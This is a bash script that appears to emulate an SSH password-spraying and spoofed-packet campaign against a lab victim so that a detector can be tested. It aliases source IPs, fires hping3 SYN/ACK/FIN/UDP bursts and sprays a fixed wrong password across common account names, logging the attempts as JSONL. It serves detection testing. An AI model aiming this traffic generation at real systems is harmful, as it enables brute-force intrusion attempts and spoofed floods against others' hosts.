#!/bin/bash

set -euo pipefail

VICTIM_IP="${1:-victima}"
VICTIM_PORT="${2:-2222}"
CAMPAIGN_ID="${CAMPAIGN_ID:-${3:-}}"
LOG_DIR="${NOVADEF_LOG_DIR:-/var/novadef/logs}"
OUTPUT_FILE="${LOG_DIR}/password_spraying_attempts.jsonl"
STOP_SIGNAL_FILE="${LOG_DIR}/stop_network_attack.signal"
SLEEP_SECONDS="${SLEEP_SECONDS:-0.0}"
CONNECT_TIMEOUT="${CONNECT_TIMEOUT:-1}"
COMMAND_TIMEOUT="${COMMAND_TIMEOUT:-0.35}"
ATTACK_DURATION_SECONDS="${ATTACK_DURATION_SECONDS:-600}"
SOURCE_BATCH_SIZE="${SOURCE_BATCH_SIZE:-12}"
ATTEMPTS_PER_PAIR="${ATTEMPTS_PER_PAIR:-8}"
# Source IP range (configurable) — must match the SOARCA block range so the
# countermeasure actually drops this traffic. Defaults align with exp1 (160-175).
SOURCE_IP_START="${SOURCE_IP_START:-160}"
SOURCE_IP_END="${SOURCE_IP_END:-175}"
# Packets per hping3 probe — higher = more visible network attack volume.
PROBE_BURST="${PROBE_BURST:-40}"
HPING_INTERVAL_US="${HPING_INTERVAL_US:-800}"
# Initial surge: extra packets per source at round 1 to create an immediate
# detection spike (same behaviour as distributed_password_spraying.sh).
INITIAL_SURGE_PACKETS_PER_SOURCE="${INITIAL_SURGE_PACKETS_PER_SOURCE:-0}"
# Limit how many target users are tried per round (0 = all). Fewer users →
# faster rounds → higher observed packet rate, easier to detect quickly.
TARGET_USER_LIMIT="${TARGET_USER_LIMIT:-0}"
ATTEMPT_SLEEP_SECONDS="${ATTEMPT_SLEEP_SECONDS:-0.0}"
CAMPAIGN="hybrid_lateral_remote_execution"
PROBE_MODES=("syn" "ack" "fin" "udp")

mkdir -p "${LOG_DIR}"
rm -f "${OUTPUT_FILE}"
touch "${OUTPUT_FILE}"
# Clear any leftover stop signal from a PRIOR run BEFORE the main loop's very
# first iteration checks for it (see the `while :; do if [ -f
# "${STOP_SIGNAL_FILE}" ]; then break; fi` guard below). The API's startup
# sweep (_kill_network_attack_everywhere) touches this same file to make sure
# any stray attack process from a previous experiment on a reused scenario
# stops — but it never removes it afterward, so a fresh invocation of this
# script found the signal already present and broke out of the loop on its
# very first check, before round_count was ever incremented. That is why the
# completion log always read "completada tras 0 rondas": the attack never
# actually ran at all, even though the launch itself reported success.
rm -f "${STOP_SIGNAL_FILE}"

stop_attack_children() {
  pkill -TERM -P $$ hping3 2>/dev/null || true
  pkill -TERM -P $$ sshpass 2>/dev/null || true
  pkill -TERM -P $$ ssh 2>/dev/null || true
}

watch_stop_signal() {
  while [ ! -f "${STOP_SIGNAL_FILE}" ]; do
    sleep 0.1
  done
  stop_attack_children
}

watch_stop_signal &
WATCHER_PID=$!
trap 'kill "${WATCHER_PID}" 2>/dev/null || true; stop_attack_children' EXIT

resolved_victim_ip="$(getent ahostsv4 "${VICTIM_IP}" | awk 'NR==1 {print $1}')"
if [ -n "${resolved_victim_ip}" ]; then
  VICTIM_TARGET="${resolved_victim_ip}"
else
  VICTIM_TARGET="${VICTIM_IP}"
fi

SOURCE_IPS=()
for last_octet in $(seq "${SOURCE_IP_START}" "${SOURCE_IP_END}"); do
  SOURCE_IPS+=("172.18.0.${last_octet}")
done

TARGET_USERS=(
  "admin"
  "root"
  "administrator"
  "backup"
  "monitoring"
  "support"
  "sales"
  "marketing"
  "finance"
  "developer"
  "devops"
  "jenkins"
  "auditor"
  "secops"
  "analyst"
  "svc-backup"
  "svc-monitor"
  "svc-ops"
  "svc-support"
  "svc-admin"
  "svc-web"
  "svc-db"
  "svc-api"
)

iface="$(ip route get "${VICTIM_TARGET}" | awk '/dev/ {for (i = 1; i <= NF; i++) if ($i == "dev") {print $(i+1); exit}}')"
if [ -z "${iface}" ]; then
  echo "No se pudo determinar la interfaz hacia ${VICTIM_TARGET}" >&2
  exit 1
fi

for src_ip in "${SOURCE_IPS[@]}"; do
  if ! ip addr show dev "${iface}" | grep -q "${src_ip}"; then
    ip addr add "${src_ip}/16" dev "${iface}" 2>/dev/null || true
  fi
done

start_epoch="$(date +%s)"
round_count=0
while :; do
  if [ -f "${STOP_SIGNAL_FILE}" ]; then
    stop_attack_children
    break
  fi
  now_epoch="$(date +%s)"
  elapsed="$((now_epoch - start_epoch))"
  if [ "${ATTACK_DURATION_SECONDS}" -gt 0 ] && [ "${elapsed}" -ge "${ATTACK_DURATION_SECONDS}" ]; then
    stop_attack_children
    break
  fi
  round_count=$((round_count + 1))
  # Fire a REAL SSH auth attempt from the first source immediately, in parallel
  # with the surge below — this is what the detector's fast-path actually keys
  # on (DETECTOR_FAST_PATH_FIRST_FAILURE / DETECTOR_IMMEDIATE_AUTH_CAMPAIGN_ALERT
  # react to the first auth failure, not to raw hping3 packet volume). Waiting
  # for the whole surge ramp to finish before the first SSH attempt was why the
  # network phase never got detected before Akira's near-instant ransomware
  # detection triggered isolation and cut the attack short.
  if [ "${round_count}" -eq 1 ] && [ -n "${SOURCE_IPS[0]:-}" ] && [ -n "${TARGET_USERS[0]:-}" ]; then
    (
      timeout "${COMMAND_TIMEOUT}" sshpass -p "WrongPassword!123" ssh \
        -o PreferredAuthentications=password \
        -o PubkeyAuthentication=no \
        -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        -o ConnectTimeout="${CONNECT_TIMEOUT}" \
        -o ConnectionAttempts=1 \
        -p "${VICTIM_PORT}" \
        -b "${SOURCE_IPS[0]}" \
        "${TARGET_USERS[0]}@${VICTIM_TARGET}" "true" >/dev/null 2>&1 || true
      # Write the JSONL line immediately after this single fast attempt (not
      # waiting for ATTEMPTS_PER_PAIR retries like the main loop below) — this
      # is the file filebeat tails into network_auth_events, which is what
      # DETECTOR_IMMEDIATE_AUTH_CAMPAIGN_ALERT reacts to. This is the earliest
      # possible network-phase signal in the whole attack.
      if [ -n "${CAMPAIGN_ID}" ]; then
        printf '{"src_ip":"%s","dst_ip":"%s","dst_port":%s,"protocol":"tcp","username":"%s","auth_success":false,"hybrid_campaign":"%s","campaign_id":"%s","timestamp":%s}\n' \
          "${SOURCE_IPS[0]}" "${VICTIM_TARGET}" "${VICTIM_PORT}" "${TARGET_USERS[0]}" "${CAMPAIGN}" "${CAMPAIGN_ID}" "$(date +%s.%3N)" >> "${OUTPUT_FILE}"
      else
        printf '{"src_ip":"%s","dst_ip":"%s","dst_port":%s,"protocol":"tcp","username":"%s","auth_success":false,"hybrid_campaign":"%s","timestamp":%s}\n' \
          "${SOURCE_IPS[0]}" "${VICTIM_TARGET}" "${VICTIM_PORT}" "${TARGET_USERS[0]}" "${CAMPAIGN}" "$(date +%s.%3N)" >> "${OUTPUT_FILE}"
      fi
    ) &
  fi
  # Initial surge, ESCALONADA en 2 oleadas cortas (40%/100% de fuentes,
  # 50%/100% del volumen por fuente) con una pausa breve entre ellas — en vez
  # de lanzar las 16 fuentes de golpe a máxima ráfaga (línea recta vertical en
  # la gráfica) o de una rampa larga que consume toda la ventana de detección
  # disponible antes de que el ransomware dispare el aislamiento. El volumen
  # total entregado es el mismo; el perfil temporal muestra un escalón corto.
  if [ "${round_count}" -eq 1 ] && [ "${INITIAL_SURGE_PACKETS_PER_SOURCE}" -gt 0 ]; then
    num_sources="${#SOURCE_IPS[@]}"
    for wave_pct_pair in "40:50" "100:100"; do
      src_pct="${wave_pct_pair%%:*}"
      pkt_pct="${wave_pct_pair##*:}"
      wave_src_count=$(( (num_sources * src_pct + 99) / 100 ))
      [ "${wave_src_count}" -gt "${num_sources}" ] && wave_src_count="${num_sources}"
      wave_pkts=$(( (INITIAL_SURGE_PACKETS_PER_SOURCE * pkt_pct + 99) / 100 ))
      [ "${wave_pkts}" -lt 1 ] && wave_pkts=1
      idx=0
      wave_pids=()
      for src_ip in "${SOURCE_IPS[@]}"; do
        idx=$((idx + 1))
        if [ "${idx}" -gt "${wave_src_count}" ]; then
          break
        fi
        hping3 -q -i "u${HPING_INTERVAL_US}" -S -c "${wave_pkts}" \
          -p "${VICTIM_PORT}" -a "${src_ip}" "${VICTIM_TARGET}" >/dev/null 2>&1 || true &
        wave_pids+=("$!")
      done
      # Wait ONLY on this wave's hping3 PIDs — NOT a bare `wait`. A bare `wait`
      # blocks on EVERY background job of this shell, which includes the
      # long-lived `watch_stop_signal` watcher (backgrounded at startup, loops
      # until the stop signal file appears). That watcher never exits on its own,
      # so a bare `wait` here hung FOREVER after wave 1: wave 2 (the bulk of the
      # surge — 16 sources × full volume) never fired, and the round-1 surge
      # delivered only wave-1's ~1.7k packets instead of the full ~9.7k. That is
      # why the network attack spike was missing from the chart even though the
      # surge block works in isolation. Waiting on the explicit PID list drains
      # only the hping3 jobs and lets the ramp proceed to wave 2.
      # `|| true` still guards against a failed hping3 (100% loss → exit 1) under
      # `set -e`.
      if [ "${#wave_pids[@]}" -gt 0 ]; then
        wait "${wave_pids[@]}" || true
      fi
      sleep "${SURGE_WAVE_GAP_SECONDS:-0.3}"
    done
  fi
  # NOTE: intentionally NO bare `wait` here. A bare `wait` blocks on the
  # long-lived `watch_stop_signal` watcher (which never exits until the stop
  # signal), hanging the round forever. The surge waves already drained their
  # own hping3 PIDs above; the round-1 fast-path SSH subshell is fire-and-forget
  # (it writes its JSONL line on its own). The per-user SSH loop below waits on
  # its own explicit `${pids[@]}`.
  # Apply TARGET_USER_LIMIT: slice the user list to speed up each round.
  if [ "${TARGET_USER_LIMIT}" -gt 0 ]; then
    ACTIVE_USERS=("${TARGET_USERS[@]:0:${TARGET_USER_LIMIT}}")
  else
    ACTIVE_USERS=("${TARGET_USERS[@]}")
  fi
  for target_user in "${ACTIVE_USERS[@]}"; do
    pids=()
    batch_count=0
    src_idx=0
    for src_ip in "${SOURCE_IPS[@]}"; do
      if [ -f "${STOP_SIGNAL_FILE}" ]; then
        stop_attack_children
        break 2
      fi
      now_epoch="$(date +%s)"
      elapsed="$((now_epoch - start_epoch))"
      if [ "${ATTACK_DURATION_SECONDS}" -gt 0 ] && [ "${elapsed}" -ge "${ATTACK_DURATION_SECONDS}" ]; then
        stop_attack_children
        break 2
      fi

      (
        if [ -f "${STOP_SIGNAL_FILE}" ]; then
          stop_attack_children
          exit 0
        fi
        probe_seed=$((round_count + src_idx))
        probe_mode="${PROBE_MODES[$((probe_seed % ${#PROBE_MODES[@]}))]}"
        case "${probe_mode}" in
          syn)
            hping3 -q -i "u${HPING_INTERVAL_US}" -S -c "${PROBE_BURST}" -p "${VICTIM_PORT}" -a "${src_ip}" -M $((1000 + probe_seed)) -d $((16 + (probe_seed % 4) * 8)) "${VICTIM_TARGET}" >/dev/null 2>&1 || true
            ;;
          ack)
            hping3 -q -i "u${HPING_INTERVAL_US}" -A -c "${PROBE_BURST}" -p "${VICTIM_PORT}" -a "${src_ip}" -M $((2000 + probe_seed)) -d $((24 + (probe_seed % 3) * 8)) "${VICTIM_TARGET}" >/dev/null 2>&1 || true
            ;;
          fin)
            hping3 -q -i "u${HPING_INTERVAL_US}" -F -c "${PROBE_BURST}" -p "${VICTIM_PORT}" -a "${src_ip}" -M $((3000 + probe_seed)) -d $((32 + (probe_seed % 5) * 4)) "${VICTIM_TARGET}" >/dev/null 2>&1 || true
            ;;
          udp)
            hping3 -q -i "u${HPING_INTERVAL_US}" -2 -c "${PROBE_BURST}" -p "${VICTIM_PORT}" -a "${src_ip}" -d $((20 + (probe_seed % 4) * 6)) "${VICTIM_TARGET}" >/dev/null 2>&1 || true
            ;;
        esac
        attempt=0
        while [ "${attempt}" -lt "${ATTEMPTS_PER_PAIR}" ]; do
          if [ -f "${STOP_SIGNAL_FILE}" ]; then
            stop_attack_children
            exit 0
          fi
          attempt=$((attempt + 1))
          timeout "${COMMAND_TIMEOUT}" sshpass -p "WrongPassword!123" ssh \
            -o PreferredAuthentications=password \
            -o PubkeyAuthentication=no \
            -o StrictHostKeyChecking=no \
            -o UserKnownHostsFile=/dev/null \
            -o ConnectTimeout="${CONNECT_TIMEOUT}" \
            -o ConnectionAttempts=1 \
            -p "${VICTIM_PORT}" \
            -b "${src_ip}" \
            "${target_user}@${VICTIM_TARGET}" "true" >/dev/null 2>&1 || true
          if [ "${ATTEMPT_SLEEP_SECONDS}" != "0" ] && [ "${ATTEMPT_SLEEP_SECONDS}" != "0.0" ]; then
            sleep "${ATTEMPT_SLEEP_SECONDS}"
          fi
        done
        if [ -f "${STOP_SIGNAL_FILE}" ]; then
          stop_attack_children
          exit 0
        fi

        if [ -n "${CAMPAIGN_ID}" ]; then
          printf '{"src_ip":"%s","dst_ip":"%s","dst_port":%s,"protocol":"tcp","username":"%s","auth_success":false,"hybrid_campaign":"%s","campaign_id":"%s","timestamp":%s}\n' \
            "${src_ip}" "${VICTIM_TARGET}" "${VICTIM_PORT}" "${target_user}" "${CAMPAIGN}" "${CAMPAIGN_ID}" "$(date +%s.%3N)" >> "${OUTPUT_FILE}"
        else
          printf '{"src_ip":"%s","dst_ip":"%s","dst_port":%s,"protocol":"tcp","username":"%s","auth_success":false,"hybrid_campaign":"%s","timestamp":%s}\n' \
            "${src_ip}" "${VICTIM_TARGET}" "${VICTIM_PORT}" "${target_user}" "${CAMPAIGN}" "$(date +%s.%3N)" >> "${OUTPUT_FILE}"
        fi
      ) &
      pids+=("$!")
      batch_count=$((batch_count + 1))
      src_idx=$((src_idx + 1))
      if [ "${batch_count}" -ge "${SOURCE_BATCH_SIZE}" ]; then
        wait "${pids[@]}" || true
        pids=()
        batch_count=0
        if [ -f "${STOP_SIGNAL_FILE}" ]; then
          stop_attack_children
          break 2
        fi
      fi
    done
    if [ "${#pids[@]}" -gt 0 ]; then
      wait "${pids[@]}" || true
    fi
    if [ -f "${STOP_SIGNAL_FILE}" ]; then
      stop_attack_children
      break 2
    fi
    sleep "${SLEEP_SECONDS}"
  done
done

echo "Hybrid lateral emulation completada tras ${round_count} rondas. Evidencia: ${OUTPUT_FILE}"
